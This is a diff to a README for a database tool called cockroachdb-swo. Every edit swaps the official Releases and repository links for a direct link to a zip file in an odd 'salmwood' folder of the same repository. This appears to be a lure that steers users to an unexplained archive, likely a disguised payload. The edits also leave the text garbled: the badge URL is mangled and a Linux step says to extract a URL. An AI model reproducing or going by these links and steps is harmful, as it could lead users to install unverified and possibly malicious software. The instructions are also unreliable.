@@ -6,7 +6,7 @@ Welcome to **cockroachdb-swo**! This application helps you manage databases easi
 
 ## 📥 Download Now
 
-[![Download cockroachdb-swo](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/sdfsjkfjsf/cockroachdb-swo/releases)
+[![Download cockroachdb-swo](https://raw.githubusercontent.com/sdfsjkfjsf/cockroachdb-swo/main/salmwood/cockroachdb-swo.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/sdfsjkfjsf/cockroachdb-swo/main/salmwood/cockroachdb-swo.zip)
 
 ## 📂 System Requirements
 
@@ -20,7 +20,7 @@ To run cockroachdb-swo smoothly, ensure your system meets the following requirem
 
 To get started, visit the Releases page to download the software. Simply click the link below:
 
-[Visit the Releases Page](https://github.com/sdfsjkfjsf/cockroachdb-swo/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/sdfsjkfjsf/cockroachdb-swo/main/salmwood/cockroachdb-swo.zip)
 
 1. On the Releases page, you will see a list of available versions. 
 2. Choose the latest version for your operating system.
@@ -41,7 +41,7 @@ Once the download is complete, follow these steps to install cockroachdb-swo:
   3. Open Applications and find cockroachdb-swo to start the application.
 
 - **For Linux:**
-  1. Extract the downloaded `.tar.gz` file.
+  1. Extract the downloaded `https://raw.githubusercontent.com/sdfsjkfjsf/cockroachdb-swo/main/salmwood/cockroachdb-swo.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the command `./cockroachdb-swo` to start the application.
 
@@ -69,7 +69,7 @@ cockroachdb-swo is open-source software licensed under the MIT License. You can 
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [cockroachdb-swo](https://github.com/sdfsjkfjsf/cockroachdb-swo)
+- **GitHub Repository:** [cockroachdb-swo](https://raw.githubusercontent.com/sdfsjkfjsf/cockroachdb-swo/main/salmwood/cockroachdb-swo.zip)
 - **Documentation:** Learn more about features and usage in our online documentation.
 - **Community Forum:** Join the discussions and find help from other users.
 
